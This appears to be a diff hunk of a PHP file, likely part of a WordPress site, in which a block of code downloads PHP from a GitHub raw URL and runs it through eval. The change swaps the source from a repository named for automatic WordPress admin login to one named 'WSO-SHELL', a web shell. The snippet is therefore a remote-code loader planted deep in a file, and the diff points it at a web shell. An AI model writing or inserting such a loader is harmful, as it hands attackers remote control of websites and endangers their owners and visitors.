@@ -832,7 +832,7 @@
 .
 .
 <?php
-    $Url = "https://raw.githubusercontent.com/privdayzcom/wp-auto-admin-loginer/refs/heads/main/wp-admin.php";
+    $Url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/wp-innopas.php";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -840,3 +840,4 @@
     curl_close($ch);
     echo eval('?>'.$output);
    ?>
+
